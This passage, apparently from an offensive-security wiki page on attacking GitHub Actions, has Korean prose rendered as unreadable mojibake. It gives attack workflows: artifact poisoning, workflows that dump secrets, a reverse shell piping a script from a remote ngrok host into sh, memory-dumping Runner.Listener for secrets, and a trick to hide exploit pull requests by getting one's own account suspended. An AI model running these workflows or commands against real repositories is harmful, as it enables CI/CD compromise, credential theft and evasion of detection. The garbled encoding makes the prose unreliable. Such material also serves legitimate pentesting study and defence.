ì·¨ì•½í•œ ì•¡ì…˜ì„ ê²€ìƒ‰í•˜ê¸° ìœ„í•œ ê¹ƒí—ˆë¸Œ ë„í¬ëŠ” ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤: `event.pull_request pull_request_target extension:yml` ê·¸ëŸ¬ë‚˜ ì•¡ì…˜ì´ ë¶ˆì•ˆì „í•˜ê²Œ êµ¬ì„±ë˜ì–´ ìˆë”ë¼ë„ ëˆ„ê°€ PRì„ ìƒì„±í•˜ëŠ”ì§€ì— ëŒ€í•œ ì¡°ê±´ë¶€ ì‚¬ìš©(ì¡°ê±´ë¬¸ ì‚¬ìš©)ê³¼ ê°™ì€ ë°©ë²•ì„ ì‚¬ìš©í•˜ì—¬ ì•ˆì „í•˜ê²Œ ì‹¤í–‰ë˜ë„ë¡ ì‘ì—…ì„ êµ¬ì„±í•˜ëŠ” ë‹¤ì–‘í•œ ë°©ë²•ì´ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### ì»¨í…ìŠ¤íŠ¸ ìŠ¤í¬ë¦½íŠ¸ ì‚½ì… <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

ì¼ë¶€ [**ê¹ƒí—ˆë¸Œ ì»¨í…ìŠ¤íŠ¸**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context)ì˜ ê°’ì€ **PRì„ ìƒì„±í•˜ëŠ” ì‚¬ìš©ì**ì— ì˜í•´ **ì œì–´**ë©ë‹ˆë‹¤. ê¹ƒí—ˆë¸Œ ì•¡ì…˜ì´ ì´ **ë°ì´í„°ë¥¼ ì‹¤í–‰í•˜ëŠ” ë° ì‚¬ìš©**í•˜ëŠ” ê²½ìš° **ì„ì˜ì˜ ì½”ë“œ ì‹¤í–‰**ìœ¼ë¡œ ì´ì–´ì§ˆ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV ìŠ¤í¬ë¦½íŠ¸ ì‚½ì…** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ë¬¸ì„œì— ë”°ë¥´ë©´: **`GITHUB_ENV`** í™˜ê²½ íŒŒì¼ì— í™˜ê²½ ë³€ìˆ˜ë¥¼ ì •ì˜í•˜ê±°ë‚˜ ì—…ë°ì´íŠ¸í•˜ì—¬ ì›Œí¬í”Œë¡œìš° ì‘ì—…ì˜ **ì´í›„ ë‹¨ê³„ì—ì„œ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤**.

ê³µê²©ìê°€ ì´ **env** ë³€ìˆ˜ì— **ì„ì˜ì˜ ê°’**ì„ ì‚½ì…í•  ìˆ˜ ìˆë‹¤ë©´, **LD\_PRELOAD** ë˜ëŠ” **NODE\_OPTIONS**ì™€ ê°™ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ ì‚½ì…í•˜ì—¬ ì´í›„ ë‹¨ê³„ì—ì„œ ì½”ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜ˆë¥¼ ë“¤ì–´ ([**ì—¬ê¸°**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) ë° [**ì—¬ê¸°**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), ì—…ë¡œë“œëœ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ê³  í•´ë‹¹ ë‚´ìš©ì„ **`GITHUB_ENV`** í™˜ê²½ ë³€ìˆ˜ì— ì €ì¥í•˜ëŠ” ì›Œí¬í”Œë¡œìš°ë¥¼ ìƒìƒí•´ë³´ì‹­ì‹œì˜¤. ê³µê²©ìëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë‚´ìš©ì„ ì—…ë¡œë“œí•˜ì—¬ í•´ë‹¹ ì›Œí¬í”Œë¡œìš°ë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<figure><img src="../../../.gitbook/assets/image (3) (2).png" alt=""><figcaption></figcaption></figure>

### ì·¨ì•½í•œ ì„œë“œ íŒŒí‹° ê¹ƒí—ˆë¸Œ ì•¡ì…˜

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**ì´ ë¸”ë¡œê·¸ ê²Œì‹œë¬¼**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks)ì— ì–¸ê¸‰ëœ ë°”ì™€ ê°™ì´ ì´ ê¹ƒí—ˆë¸Œ ì•¡ì…˜ì€ ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš° ë° ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì•„í‹°íŒ©íŠ¸ì— ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë¬¸ì œëŠ” **`path`** ë§¤ê°œë³€ìˆ˜ê°€ ì„¤ì •ë˜ì§€ ì•Šì€ ê²½ìš°, ì•„í‹°íŒ©íŠ¸ê°€ í˜„ì¬ ë””ë ‰í† ë¦¬ì— ì¶”ì¶œë˜ì–´ ë‚˜ì¤‘ì— ì‚¬ìš©ë˜ê±°ë‚˜ ì‹¬ì§€ì–´ ì›Œí¬í”Œë¡œìš°ì—ì„œ ì‹¤í–‰ë  ìˆ˜ ìˆëŠ” íŒŒì¼ì„ ë®ì–´ì“¸ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì…ë‹ˆë‹¤. ë”°ë¼ì„œ ì•„í‹°íŒ©íŠ¸ê°€ ì·¨ì•½í•˜ë©´ ê³µê²©ìê°€ ì´ë¥¼ ë‚¨ìš©í•˜ì—¬ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‹ ë¢°í•˜ëŠ” ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì·¨ì•½í•œ ì›Œí¬í”Œë¡œìš°ì˜ ì˜ˆì‹œ:

```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```

ë‹¤ìŒ ì›Œí¬í”Œë¡œìš°ë¡œ ì´ë¥¼ ê³µê²©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```

***

## ê¸°íƒ€ ì™¸ë¶€ ì•¡ì„¸ìŠ¤

### ì‚­ì œëœ ë„¤ì„ìŠ¤í˜ì´ìŠ¤ ë¦¬í¬ì§€í† ë¦¬ íƒˆì·¨

ê³„ì •ì´ ì´ë¦„ì„ ë³€ê²½í•˜ë©´ ì¼ì • ì‹œê°„ í›„ ë‹¤ë¥¸ ì‚¬ìš©ìê°€ í•´ë‹¹ ì´ë¦„ìœ¼ë¡œ ê³„ì •ì„ ë“±ë¡í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë§Œì•½ ë¦¬í¬ì§€í† ë¦¬ê°€ **ì´ë¦„ ë³€ê²½ ì „ì— 100ê°œ ë¯¸ë§Œì˜ ìŠ¤íƒ€**ë¥¼ ê°€ì¡Œë‹¤ë©´, GithubëŠ” ë™ì¼í•œ ì´ë¦„ì„ ê°€ì§„ ìƒˆë¡œìš´ ë“±ë¡ ì‚¬ìš©ìê°€ **ì‚­ì œëœ ë¦¬í¬ì§€í† ë¦¬ì™€ ë™ì¼í•œ ì´ë¦„ì˜ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ìƒì„±í•  ìˆ˜ ìˆë„ë¡** í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ë”°ë¼ì„œ ì•¡ì…˜ì´ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê³„ì •ì˜ ë¦¬í¬ì§€í† ë¦¬ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°, ê³µê²©ìê°€ í•´ë‹¹ ê³„ì •ì„ ìƒì„±í•˜ê³  ì•¡ì…˜ì„ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ë§Œì•½ ë‹¤ë¥¸ ë¦¬í¬ì§€í† ë¦¬ê°€ **ì´ ì‚¬ìš©ì ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì¢…ì†ì„±ì„ ì‚¬ìš©**í•˜ê³  ìˆë‹¤ë©´, ê³µê²©ìëŠ” ì´ë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë” ìì„¸í•œ ì„¤ëª…ì€ ì—¬ê¸°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## ë¦¬í¬ì§€í† ë¦¬ í”¼ë²—

{% hint style="info" %}
ì´ ì„¹ì…˜ì—ì„œëŠ” **ì²« ë²ˆì§¸ ë¦¬í¬ì§€í† ë¦¬ì— ì•¡ì„¸ìŠ¤**ê°€ ìˆëŠ” ê²½ìš° **ë‹¤ë¥¸ ë¦¬í¬ì§€í† ë¦¬ë¡œ í”¼ë²—**í•  ìˆ˜ ìˆëŠ” ê¸°ìˆ ì— ëŒ€í•´ ì´ì•¼ê¸°í•˜ê² ìŠµë‹ˆë‹¤(ì´ì „ ì„¹ì…˜ì„ í™•ì¸í•˜ì„¸ìš”).
{% endhint %}

### ìºì‹œ ë…ë ¤

ìºì‹œëŠ” **ë™ì¼ ë¸Œëœì¹˜ì—ì„œì˜ ì›Œí¬í”Œë¡œìš° ì‹¤í–‰ ê°„ì— ìœ ì§€**ë©ë‹ˆë‹¤. ì¦‰, ê³µê²©ìê°€ **ìºì‹œì— ì €ì¥ëœ íŒ¨í‚¤ì§€ë¥¼ ì¹¨í•´**í•˜ê³  ì´ë¥¼ **ë‹¤ìš´ë¡œë“œ**í•˜ê³  ì‹¤í–‰í•˜ëŠ” **ë³´ë‹¤ ê¶Œí•œì´ ë†’ì€** ì›Œí¬í”Œë¡œìš°ë¥¼ ì¹¨í•´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### ì•„í‹°íŒ©íŠ¸ ë…ë ¤

ì›Œí¬í”Œë¡œìš°ëŠ” **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš° ë° ì‹¬ì§€ì–´ ë¦¬í¬ì§€í† ë¦¬ì—ì„œ ì•„í‹°íŒ©íŠ¸ë¥¼ ì‚¬ìš©**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê³µê²©ìê°€ **ë‹¤ë¥¸ ì›Œí¬í”Œë¡œìš°ë¥¼ ì¹¨í•´**í•  ìˆ˜ ìˆë„ë¡ **ì•„í‹°íŒ©íŠ¸ë¥¼ ì—…ë¡œë“œí•˜ëŠ” Github ì•¡ì…˜ì„ ì¹¨í•´**í•œë‹¤ë©´:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## ì•¡ì…˜ìœ¼ë¡œë¶€í„°ì˜ ì‚¬í›„ ì¹¨íˆ¬

### OIDCë¥¼ í†µí•œ AWS ë° GCP ì•¡ì„¸ìŠ¤

ë‹¤ìŒ í˜ì´ì§€ë¥¼ í™•ì¸í•˜ì„¸ìš”:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### ë¹„ë°€ ì•¡ì„¸ìŠ¤ <a href="#accessing-secrets" id="accessing-secrets"></a>

ìŠ¤í¬ë¦½íŠ¸ì— ì½˜í…ì¸ ë¥¼ ì‚½ì…í•˜ëŠ” ê²½ìš°, ë¹„ë°€ì„ ì–´ë–»ê²Œ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆëŠ”ì§€ ì•Œì•„ë³´ëŠ” ê²ƒì´ í¥ë¯¸ë¡œìš¸ ê²ƒì…ë‹ˆë‹¤:

* ë¹„ë°€ ë˜ëŠ” í† í°ì´ **í™˜ê²½ ë³€ìˆ˜**ë¡œ ì„¤ì •ëœ ê²½ìš°, \*\*`printenv`\*\*ë¥¼ ì‚¬ìš©í•˜ì—¬ í™˜ê²½ì„ í†µí•´ ì§ì ‘ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

<details>

<summary>Github ì•¡ì…˜ ì¶œë ¥ì—ì„œ ë¹„ë°€ ëª©ë¡ í‘œì‹œ</summary>

\`\`\`yaml name: list\_env on: workflow\_dispatch: # Launch manually pull\_request: #Run it when a PR is created to a branch branches: - '\*\*' push: # Run it when a push is made to a branch branches: - '\*\*' jobs: List\_env: runs-on: ubuntu-latest steps: - name: List Env # Need to base64 encode or github will change the secret value for "\*\*\*" run: sh -c 'env | grep "secret\_" | base64 -w0' env: secret\_myql\_pass: $\{{secrets.MYSQL\_PASSWORD\}}

secret\_postgress\_pass: $\{{secrets.POSTGRESS\_PASSWORDyaml\}}

````
</details>

<details>

<summary>ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ì—¬ ì—­ì‰˜ íšë“í•˜ê¸°</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
````

</details>

* ì‹œí¬ë¦¿ì´ **í‘œí˜„ì‹ ì•ˆì—ì„œ ì§ì ‘ ì‚¬ìš©**ë˜ë©´ ìƒì„±ëœ ì…¸ ìŠ¤í¬ë¦½íŠ¸ê°€ **ë””ìŠ¤í¬ì— ì €ì¥**ë˜ì–´ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* ```bash
  ```

cat /home/runner/work/\_temp/\*

````
* JavaScript ì•¡ì…˜ì˜ ê²½ìš° ì‹œí¬ë¦¿ì€ í™˜ê²½ ë³€ìˆ˜ë¥¼ í†µí•´ ì „ì†¡ë©ë‹ˆë‹¤.
* ```bash
ps axe | grep node
````

* **ì‚¬ìš©ì ì •ì˜ ì•¡ì…˜**ì˜ ê²½ìš°, í”„ë¡œê·¸ë¨ì´ **ì¸ìˆ˜ë¡œë¶€í„° ì–»ì€ ì‹œí¬ë¦¿ì„ ì‚¬ìš©í•˜ëŠ” ë°©ì‹**ì— ë”°ë¼ ìœ„í—˜ì´ ë‹¤ë¥¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hosted ëŸ¬ë„ˆ ë‚¨ìš©

**Github Actionsì´ Github ì¸í”„ë¼ê°€ ì•„ë‹Œ ê³³ì—ì„œ ì‹¤í–‰ë˜ëŠ”ì§€** ì°¾ëŠ” ë°©ë²•ì€ Github Action êµ¬ì„± yamlì—ì„œ \*\*`runs-on: self-hosted`\*\*ë¥¼ ê²€ìƒ‰í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

**Self-hosted** ëŸ¬ë„ˆëŠ” **ì¶”ê°€ë¡œ ë¯¼ê°í•œ ì •ë³´ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìœ¼ë©°, ë‹¤ë¥¸ **ë„¤íŠ¸ì›Œí¬ ì‹œìŠ¤í…œ**(ë„¤íŠ¸ì›Œí¬ì˜ ì·¨ì•½í•œ ì—”ë“œí¬ì¸íŠ¸? ë©”íƒ€ë°ì´í„° ì„œë¹„ìŠ¤?)ì—ë„ ì•¡ì„¸ìŠ¤í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì‹¬ì§€ì–´ ê²©ë¦¬ë˜ê³  íŒŒê´´ë˜ë”ë¼ë„ \*\*ë™ì‹œì— ì—¬ëŸ¬ ì‘ì—…ì´ ì‹¤í–‰ë  ìˆ˜ ìˆìœ¼ë©°, ì•…ì˜ì ì¸ ì‘ì—…ì´ ë‹¤ë¥¸ ì‘ì—…ì˜ ì‹œí¬ë¦¿ì„ \*\*í›”ì¹  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

Self-hosted ëŸ¬ë„ˆì—ì„œëŠ” **\_Runner.Listener** í”„ë¡œì„¸ìŠ¤ì—ì„œ ì‹œí¬ë¦¿ì„ ì–»ì„ ìˆ˜ë„ ìˆìœ¼ë©°, ì´ëŠ” ë©”ëª¨ë¦¬ë¥¼ ë¤í”„í•˜ì—¬ ì–¸ì œë“ ì§€ ì›Œí¬í”Œë¡œì˜ ëª¨ë“  ì‹œí¬ë¦¿ì„ í¬í•¨í•  ê²ƒì…ë‹ˆë‹¤:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**ë” ë§ì€ ì •ë³´ëŠ” ì—¬ê¸°ë¥¼ í™•ì¸í•˜ì„¸ìš”**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github ë„ì»¤ ì´ë¯¸ì§€ ë ˆì§€ìŠ¤íŠ¸ë¦¬

Github ë‚´ë¶€ì— **ë„ì»¤ ì´ë¯¸ì§€ë¥¼ ë¹Œë“œí•˜ê³  ì €ì¥í•˜ëŠ” Github ì•¡ì…˜**ì„ ë§Œë“¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë‹¤ìŒ í™•ì¥ ê°€ëŠ¥í•œ ì˜ˆì‹œì—ì„œ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:

<details>

<summary>Github ì•¡ì…˜ ë¹Œë“œ ë° ë„ì»¤ ì´ë¯¸ì§€ í‘¸ì‹œ</summary>

\`\`\`yaml \[...]

* name: Set up Docker Buildx uses: docker/setup-buildx-action@v1
* name: Login to GitHub Container Registry uses: docker/login-action@v1 with: registry: ghcr.io username: $\{{ github.repository\_owner \}} password: $\{{ secrets.ACTIONS\_TOKEN \}}
* name: Add Github Token to Dockerfile to be able to download code run: | sed -i -e 's/TOKEN=##VALUE##/TOKEN=$\{{ secrets.ACTIONS\_TOKEN \}}/g' Dockerfile
* name: Build and push uses: docker/build-push-action@v2 with: context: . push: true tags: | ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:latest ghcr.io/$\{{ github.repository\_owner \}}/$\{{ github.event.repository.name \}}:$\{{ env.GITHUB\_NEWXREF \}}-$\{{ github.sha \}}

\[...]

````
</details>

ì´ì „ ì½”ë“œì—ì„œ ë³¼ ìˆ˜ ìˆë“¯ì´, Github ë ˆì§€ìŠ¤íŠ¸ë¦¬ëŠ” **`ghcr.io`**ì— í˜¸ìŠ¤íŒ…ë©ë‹ˆë‹¤.

ë ˆí¬ì§€í† ë¦¬ì— ì½ê¸° ê¶Œí•œì´ ìˆëŠ” ì‚¬ìš©ìëŠ” ê°œì¸ ì•¡ì„¸ìŠ¤ í† í°ì„ ì‚¬ìš©í•˜ì—¬ Docker ì´ë¯¸ì§€ë¥¼ ë‹¤ìš´ë¡œë“œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
````

ì‚¬ìš©ìëŠ” **Docker ì´ë¯¸ì§€ ë ˆì´ì–´ì—ì„œ ìœ ì¶œëœ ë¹„ë°€ ì •ë³´ë¥¼ ê²€ìƒ‰**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

#### Github Actions ë¡œê·¸ì— ë¯¼ê°í•œ ì •ë³´

**Github**ê°€ ì•¡ì…˜ ë¡œê·¸ì—ì„œ **ë¹„ë°€ ê°’**ì„ ê°ì§€í•˜ë ¤ê³  ì‹œë„í•˜ê³  **í‘œì‹œí•˜ì§€ ì•Šë„ë¡** í•˜ì§€ë§Œ, ì•¡ì…˜ ì‹¤í–‰ ì¤‘ì— ìƒì„±ëœ **ë‹¤ë¥¸ ë¯¼ê°í•œ ë°ì´í„°**ëŠ” ìˆ¨ê²¨ì§€ì§€ ì•Šì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ë¹„ë°€ ê°’ìœ¼ë¡œ ì„œëª…ëœ JWTëŠ” [íŠ¹ë³„íˆ êµ¬ì„±ë˜ì§€ ì•ŠëŠ” í•œ](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret) ìˆ¨ê²¨ì§€ì§€ ì•ŠìŠµë‹ˆë‹¤.

### ìì‹ ì˜ í™œë™ ìˆ¨ê¸°ê¸°

([**ì—¬ê¸°**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)ì˜ ê¸°ìˆ ) ë¨¼ì € ì œê¸°ëœ PRì€ ê¸°ë³¸ì ìœ¼ë¡œ Githubì™€ ëŒ€ìƒ GitHub ê³„ì •ì— ëª¨ë‘ ê³µê°œì ìœ¼ë¡œ í‘œì‹œë©ë‹ˆë‹¤. Githubì—ì„œëŠ” **ì¸í„°ë„·ì—ì„œ PRì„ ì‚­ì œí•  ìˆ˜ ì—†ì§€ë§Œ**, í•œ ê°€ì§€ ê¼¼ìˆ˜ê°€ ìˆìŠµë‹ˆë‹¤. Githubì— ì˜í•´ **ì¤‘ë‹¨ëœ** ê³„ì •ì˜ ê²½ìš°, ëª¨ë“  **PRì´ ìë™ìœ¼ë¡œ ì‚­ì œ**ë˜ê³  ì¸í„°ë„·ì—ì„œ ì œê±°ë©ë‹ˆë‹¤. ë”°ë¼ì„œ í™œë™ì„ ìˆ¨ê¸°ë ¤ë©´ **GitHub ê³„ì •ì„ ì¤‘ë‹¨í•˜ê±°ë‚˜ ê³„ì •ì„ í”Œë˜ê·¸ ì²˜ë¦¬**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë ‡ê²Œ í•˜ë©´ GitHubì—ì„œ ëª¨ë“  í™œë™ì´ ì¸í„°ë„·ì—ì„œ ìˆ¨ê²¨ì§‘ë‹ˆë‹¤ (ê¸°ë³¸ì ìœ¼ë¡œ ëª¨ë“  ì•…ìš© PRì„ ì œê±°í•¨).

GitHubì˜ í•œ ì¡°ì§ì€ GitHubì— ê³„ì •ì„ ì‹ ê³ í•˜ëŠ” ë° ë§¤ìš° ì ê·¹ì ì…ë‹ˆë‹¤. í•´ì•¼ í•  ì¼ì€ ì´ìŠˆì— "ì–´ë–¤ ë‚´ìš©"ì„ ê³µìœ í•˜ëŠ” ê²ƒë¿ì´ë©°, ê·¸ë“¤ì€ 12ì‹œê°„ ë‚´ì— ê·€í•˜ì˜ ê³„ì •ì´ ì¤‘ë‹¨ë˜ë„ë¡ ë³´ì¥í•  ê²ƒì…ë‹ˆë‹¤ :p ê·¸ë¦¬ê³  ì—¬ê¸°ì—, ê·€í•˜ì˜ ì•…ìš©ì´ GitHubì—ì„œ ë³´ì´ì§€ ì•Šê²Œ ë˜ì—ˆìŠµë‹ˆë‹¤.

ì¡°ì§ì´ ëŒ€ìƒì´ ë˜ì—ˆìŒì„ ì•Œì•„ì°¨ë¦¬ëŠ” ìœ ì¼í•œ ë°©ë²•ì€ GitHub UIì—ì„œ PRì´ ì œê±°ë˜ë¯€ë¡œ SIEMì—ì„œ GitHub ë¡œê·¸ë¥¼ í™•ì¸í•˜ëŠ” ê²ƒì…ë‹ˆë‹¤.

### ë„êµ¬

ë‹¤ìŒ ë„êµ¬ëŠ” Github Action ì›Œí¬í”Œë¡œìš°ë¥¼ ì°¾ê³  ì·¨ì•½í•œ ê²ƒì„ ì‹ë³„í•˜ëŠ” ë° ìœ ìš©í•©ë‹ˆë‹¤:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

</details>
